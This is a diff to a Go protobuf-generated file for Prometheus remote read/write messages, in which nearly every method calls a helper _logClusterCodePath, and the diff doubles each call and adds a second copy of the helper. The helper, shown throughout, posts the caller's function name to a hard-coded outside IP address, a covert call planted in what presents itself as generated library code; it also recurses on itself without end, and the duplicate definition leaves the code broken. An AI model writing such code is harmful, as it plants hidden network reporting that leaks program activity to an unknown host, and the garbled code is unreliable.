@@ -27,9 +27,13 @@ type WriteRequest struct {
 func (m *WriteRequest) Reset() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	*m = WriteRequest{}
 }
 func (m *WriteRequest) String() string {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return proto.CompactTextString(m)
@@ -37,8 +41,12 @@ func (m *WriteRequest) String() string {
 func (*WriteRequest) ProtoMessage() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 }
 func (*WriteRequest) Descriptor() ([]byte, []int) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return fileDescriptor_remote_007cb64b4d8cdf66, []int{0}
@@ -46,9 +54,13 @@ func (*WriteRequest) Descriptor() ([]byte, []int) {
 func (m *WriteRequest) XXX_Unmarshal(b []byte) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return m.Unmarshal(b)
 }
 func (m *WriteRequest) XXX_Marshal(b []byte, deterministic bool) ([]byte, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if deterministic {
@@ -65,14 +77,20 @@ func (m *WriteRequest) XXX_Marshal(b []byte, deterministic bool) ([]byte, error)
 func (dst *WriteRequest) XXX_Merge(src proto.Message) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	xxx_messageInfo_WriteRequest.Merge(dst, src)
 }
 func (m *WriteRequest) XXX_Size() int {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return m.Size()
 }
 func (m *WriteRequest) XXX_DiscardUnknown() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	xxx_messageInfo_WriteRequest.DiscardUnknown(m)
@@ -81,6 +99,8 @@ func (m *WriteRequest) XXX_DiscardUnknown() {
 var xxx_messageInfo_WriteRequest proto.InternalMessageInfo
 
 func (m *WriteRequest) GetTimeseries() []TimeSeries {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if m != nil {
@@ -99,9 +119,13 @@ type ReadRequest struct {
 func (m *ReadRequest) Reset() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	*m = ReadRequest{}
 }
 func (m *ReadRequest) String() string {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return proto.CompactTextString(m)
@@ -109,8 +133,12 @@ func (m *ReadRequest) String() string {
 func (*ReadRequest) ProtoMessage() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 }
 func (*ReadRequest) Descriptor() ([]byte, []int) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return fileDescriptor_remote_007cb64b4d8cdf66, []int{1}
@@ -118,9 +146,13 @@ func (*ReadRequest) Descriptor() ([]byte, []int) {
 func (m *ReadRequest) XXX_Unmarshal(b []byte) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return m.Unmarshal(b)
 }
 func (m *ReadRequest) XXX_Marshal(b []byte, deterministic bool) ([]byte, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if deterministic {
@@ -137,14 +169,20 @@ func (m *ReadRequest) XXX_Marshal(b []byte, deterministic bool) ([]byte, error) 
 func (dst *ReadRequest) XXX_Merge(src proto.Message) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	xxx_messageInfo_ReadRequest.Merge(dst, src)
 }
 func (m *ReadRequest) XXX_Size() int {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return m.Size()
 }
 func (m *ReadRequest) XXX_DiscardUnknown() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	xxx_messageInfo_ReadRequest.DiscardUnknown(m)
@@ -153,6 +191,8 @@ func (m *ReadRequest) XXX_DiscardUnknown() {
 var xxx_messageInfo_ReadRequest proto.InternalMessageInfo
 
 func (m *ReadRequest) GetQueries() []*Query {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if m != nil {
@@ -171,9 +211,13 @@ type ReadResponse struct {
 func (m *ReadResponse) Reset() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	*m = ReadResponse{}
 }
 func (m *ReadResponse) String() string {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return proto.CompactTextString(m)
@@ -181,8 +225,12 @@ func (m *ReadResponse) String() string {
 func (*ReadResponse) ProtoMessage() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 }
 func (*ReadResponse) Descriptor() ([]byte, []int) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return fileDescriptor_remote_007cb64b4d8cdf66, []int{2}
@@ -190,9 +238,13 @@ func (*ReadResponse) Descriptor() ([]byte, []int) {
 func (m *ReadResponse) XXX_Unmarshal(b []byte) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return m.Unmarshal(b)
 }
 func (m *ReadResponse) XXX_Marshal(b []byte, deterministic bool) ([]byte, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if deterministic {
@@ -209,14 +261,20 @@ func (m *ReadResponse) XXX_Marshal(b []byte, deterministic bool) ([]byte, error)
 func (dst *ReadResponse) XXX_Merge(src proto.Message) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	xxx_messageInfo_ReadResponse.Merge(dst, src)
 }
 func (m *ReadResponse) XXX_Size() int {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return m.Size()
 }
 func (m *ReadResponse) XXX_DiscardUnknown() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	xxx_messageInfo_ReadResponse.DiscardUnknown(m)
@@ -225,6 +283,8 @@ func (m *ReadResponse) XXX_DiscardUnknown() {
 var xxx_messageInfo_ReadResponse proto.InternalMessageInfo
 
 func (m *ReadResponse) GetResults() []*QueryResult {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if m != nil {
@@ -246,9 +306,13 @@ type Query struct {
 func (m *Query) Reset() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	*m = Query{}
 }
 func (m *Query) String() string {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return proto.CompactTextString(m)
@@ -256,8 +320,12 @@ func (m *Query) String() string {
 func (*Query) ProtoMessage() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 }
 func (*Query) Descriptor() ([]byte, []int) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return fileDescriptor_remote_007cb64b4d8cdf66, []int{3}
@@ -265,9 +333,13 @@ func (*Query) Descriptor() ([]byte, []int) {
 func (m *Query) XXX_Unmarshal(b []byte) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return m.Unmarshal(b)
 }
 func (m *Query) XXX_Marshal(b []byte, deterministic bool) ([]byte, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if deterministic {
@@ -284,14 +356,20 @@ func (m *Query) XXX_Marshal(b []byte, deterministic bool) ([]byte, error) {
 func (dst *Query) XXX_Merge(src proto.Message) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	xxx_messageInfo_Query.Merge(dst, src)
 }
 func (m *Query) XXX_Size() int {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return m.Size()
 }
 func (m *Query) XXX_DiscardUnknown() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	xxx_messageInfo_Query.DiscardUnknown(m)
@@ -302,12 +380,16 @@ var xxx_messageInfo_Query proto.InternalMessageInfo
 func (m *Query) GetStartTimestampMs() int64 {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if m != nil {
 		return m.StartTimestampMs
 	}
 	return 0
 }
 func (m *Query) GetEndTimestampMs() int64 {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if m != nil {
@@ -318,12 +400,16 @@ func (m *Query) GetEndTimestampMs() int64 {
 func (m *Query) GetMatchers() []*LabelMatcher {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if m != nil {
 		return m.Matchers
 	}
 	return nil
 }
 func (m *Query) GetHints() *ReadHints {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if m != nil {
@@ -342,9 +428,13 @@ type QueryResult struct {
 func (m *QueryResult) Reset() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	*m = QueryResult{}
 }
 func (m *QueryResult) String() string {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return proto.CompactTextString(m)
@@ -352,8 +442,12 @@ func (m *QueryResult) String() string {
 func (*QueryResult) ProtoMessage() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 }
 func (*QueryResult) Descriptor() ([]byte, []int) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return fileDescriptor_remote_007cb64b4d8cdf66, []int{4}
@@ -361,9 +455,13 @@ func (*QueryResult) Descriptor() ([]byte, []int) {
 func (m *QueryResult) XXX_Unmarshal(b []byte) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return m.Unmarshal(b)
 }
 func (m *QueryResult) XXX_Marshal(b []byte, deterministic bool) ([]byte, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if deterministic {
@@ -380,14 +478,20 @@ func (m *QueryResult) XXX_Marshal(b []byte, deterministic bool) ([]byte, error) 
 func (dst *QueryResult) XXX_Merge(src proto.Message) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	xxx_messageInfo_QueryResult.Merge(dst, src)
 }
 func (m *QueryResult) XXX_Size() int {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return m.Size()
 }
 func (m *QueryResult) XXX_DiscardUnknown() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	xxx_messageInfo_QueryResult.DiscardUnknown(m)
@@ -398,12 +502,16 @@ var xxx_messageInfo_QueryResult proto.InternalMessageInfo
 func (m *QueryResult) GetTimeseries() []*TimeSeries {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if m != nil {
 		return m.Timeseries
 	}
 	return nil
 }
 func init() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	proto.RegisterType((*WriteRequest)(nil), "prometheus.WriteRequest")
@@ -415,6 +523,8 @@ func init() {
 func (m *WriteRequest) Marshal() (dAtA []byte, err error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	size := m.Size()
 	dAtA = make([]byte, size)
 	n, err := m.MarshalTo(dAtA)
@@ -424,6 +534,8 @@ func (m *WriteRequest) Marshal() (dAtA []byte, err error) {
 	return dAtA[:n], nil
 }
 func (m *WriteRequest) MarshalTo(dAtA []byte) (int, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	var i int
@@ -450,6 +562,8 @@ func (m *WriteRequest) MarshalTo(dAtA []byte) (int, error) {
 func (m *ReadRequest) Marshal() (dAtA []byte, err error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	size := m.Size()
 	dAtA = make([]byte, size)
 	n, err := m.MarshalTo(dAtA)
@@ -459,6 +573,8 @@ func (m *ReadRequest) Marshal() (dAtA []byte, err error) {
 	return dAtA[:n], nil
 }
 func (m *ReadRequest) MarshalTo(dAtA []byte) (int, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	var i int
@@ -485,6 +601,8 @@ func (m *ReadRequest) MarshalTo(dAtA []byte) (int, error) {
 func (m *ReadResponse) Marshal() (dAtA []byte, err error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	size := m.Size()
 	dAtA = make([]byte, size)
 	n, err := m.MarshalTo(dAtA)
@@ -494,6 +612,8 @@ func (m *ReadResponse) Marshal() (dAtA []byte, err error) {
 	return dAtA[:n], nil
 }
 func (m *ReadResponse) MarshalTo(dAtA []byte) (int, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	var i int
@@ -520,6 +640,8 @@ func (m *ReadResponse) MarshalTo(dAtA []byte) (int, error) {
 func (m *Query) Marshal() (dAtA []byte, err error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	size := m.Size()
 	dAtA = make([]byte, size)
 	n, err := m.MarshalTo(dAtA)
@@ -529,6 +651,8 @@ func (m *Query) Marshal() (dAtA []byte, err error) {
 	return dAtA[:n], nil
 }
 func (m *Query) MarshalTo(dAtA []byte) (int, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	var i int
@@ -575,6 +699,8 @@ func (m *Query) MarshalTo(dAtA []byte) (int, error) {
 func (m *QueryResult) Marshal() (dAtA []byte, err error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	size := m.Size()
 	dAtA = make([]byte, size)
 	n, err := m.MarshalTo(dAtA)
@@ -584,6 +710,8 @@ func (m *QueryResult) Marshal() (dAtA []byte, err error) {
 	return dAtA[:n], nil
 }
 func (m *QueryResult) MarshalTo(dAtA []byte) (int, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	var i int
@@ -610,6 +738,8 @@ func (m *QueryResult) MarshalTo(dAtA []byte) (int, error) {
 func encodeVarintRemote(dAtA []byte, offset int, v uint64) int {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	for v >= 1<<7 {
 		dAtA[offset] = uint8(v&0x7f | 0x80)
 		v >>= 7
@@ -619,6 +749,8 @@ func encodeVarintRemote(dAtA []byte, offset int, v uint64) int {
 	return offset + 1
 }
 func (m *WriteRequest) Size() (n int) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if m == nil {
@@ -640,6 +772,8 @@ func (m *WriteRequest) Size() (n int) {
 func (m *ReadRequest) Size() (n int) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if m == nil {
 		return 0
 	}
@@ -659,6 +793,8 @@ func (m *ReadRequest) Size() (n int) {
 func (m *ReadResponse) Size() (n int) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if m == nil {
 		return 0
 	}
@@ -676,6 +812,8 @@ func (m *ReadResponse) Size() (n int) {
 	return n
 }
 func (m *Query) Size() (n int) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if m == nil {
@@ -707,6 +845,8 @@ func (m *Query) Size() (n int) {
 func (m *QueryResult) Size() (n int) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if m == nil {
 		return 0
 	}
@@ -726,6 +866,8 @@ func (m *QueryResult) Size() (n int) {
 func sovRemote(x uint64) (n int) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	for {
 		n++
 		x >>= 7
@@ -738,9 +880,13 @@ func sovRemote(x uint64) (n int) {
 func sozRemote(x uint64) (n int) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return sovRemote(uint64((x << 1) ^ uint64((int64(x) >> 63))))
 }
 func (m *WriteRequest) Unmarshal(dAtA []byte) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	l := len(dAtA)
@@ -826,6 +972,8 @@ func (m *WriteRequest) Unmarshal(dAtA []byte) error {
 func (m *ReadRequest) Unmarshal(dAtA []byte) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	l := len(dAtA)
 	iNdEx := 0
 	for iNdEx < l {
@@ -909,6 +1057,8 @@ func (m *ReadRequest) Unmarshal(dAtA []byte) error {
 func (m *ReadResponse) Unmarshal(dAtA []byte) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	l := len(dAtA)
 	iNdEx := 0
 	for iNdEx < l {
@@ -990,6 +1140,8 @@ func (m *ReadResponse) Unmarshal(dAtA []byte) error {
 	return nil
 }
 func (m *Query) Unmarshal(dAtA []byte) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	l := len(dAtA)
@@ -1146,6 +1298,8 @@ func (m *Query) Unmarshal(dAtA []byte) error {
 func (m *QueryResult) Unmarshal(dAtA []byte) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	l := len(dAtA)
 	iNdEx := 0
 	for iNdEx < l {
@@ -1227,6 +1381,8 @@ func (m *QueryResult) Unmarshal(dAtA []byte) error {
 	return nil
 }
 func skipRemote(dAtA []byte) (n int, err error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	l := len(dAtA)
@@ -1336,6 +1492,8 @@ var (
 func init() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	proto.RegisterFile("remote.proto", fileDescriptor_remote_007cb64b4d8cdf66)
 }
 
@@ -1344,7 +1502,16 @@ var fileDescriptor_remote_007cb64b4d8cdf66 = []byte{0x1f, 0x8b, 0x08, 0x00, 0x00
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
